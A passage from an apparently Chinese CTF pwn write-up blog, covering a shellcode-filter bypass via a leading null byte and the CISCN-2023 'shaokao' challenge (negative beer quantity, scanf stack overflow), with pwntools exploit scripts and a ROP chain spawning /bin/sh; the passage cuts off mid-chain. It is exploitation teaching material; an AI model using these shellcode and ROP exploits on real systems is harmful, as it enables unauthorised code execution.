[rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_4007F8(a1, a2, a3);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me shellcode, plz:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400786(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong shellcode!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以执行shellcode但是要先绕过if的检查</p><p>而检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400786</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="string">&quot;ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\n&quot;</span>; *i &amp;&amp; *i != *a1; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>却非常阴间，如果真的按照这个去执行，很难才能get shell，笔者还是太菜了，想不出来看了网上大佬的wp，发现我只注意for循环却没注意到第一个while(*a1)只要让这个为假就能跳过了，因此在shell开头扔个\x00即可跳过检查，再后面搭配几个字节码凑个汇编之后加上自己的shellcode就可以getshell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">b&#x27;\x00\x42\x00&#x27;</span>+asm(shellcraft.amd64.linux.sh())</span><br><span class="line">p=process(<span class="string">&#x27;./babyshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly%E8%BF%99%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E7%A0%81%E8%BD%AC%E6%B1%87%E7%BC%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%A6%81%E6%89%BE\x00%E4%B9%8B%E5%90%8E%E6%8E%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81%E5%90%8E%E7%9A%84%E6%B1%87%E7%BC%96%E3%80%82%E3%80%82">https://defuse.ca/online-x86-assembler.htm#disassembly这可以实现机器码转汇编，因为要找\x00之后接的机器码后的汇编。。</a></p><p>还是太菜了，任重而道远。。。</p><h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653180.png" alt="image-20240509003059436" style="zoom:50%;" /><h1 id="CISCN-2023-烧烤摊儿"><a href="#CISCN-2023-烧烤摊儿" class="headerlink" title="CISCN-2023 烧烤摊儿"></a>CISCN-2023 烧烤摊儿</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)menu(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        pijiu();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        chuan();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        yue(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        vip();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( own )</span><br><span class="line">          gaiming();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">menu</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;欢迎来到%s烧烤摊儿，来点啥？\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;name, a3, a4, a5, a6);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. 啤酒&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. 烤串&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. 钱包余额&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. 承包摊位&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( own )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. 改名&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0. 离开&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v11, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现当own为真时有新的选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">gaiming</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_s, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v5, v0, v1, v2, v3);<span class="comment">// 栈溢出</span></span><br><span class="line">  j_strcpy_ifunc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有个栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pijiu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> choose; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  choose = <span class="number">1</span>;</span><br><span class="line">  num = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. 青岛啤酒&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. 燕京U8&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. 勇闯天涯&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;choose, v0, v1, v2, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;来几瓶？&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;num, v4, v5, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * num &gt;= money )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;诶哟，钱不够了&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    money += <span class="number">-10</span> * num;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_4B7105);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这个计算钱的方式很奇怪，当买的为负数时，会加钱，而加钱可以买摊位，然后就有栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:io.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:io.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:io.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :io.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28368</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">io=run()</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span 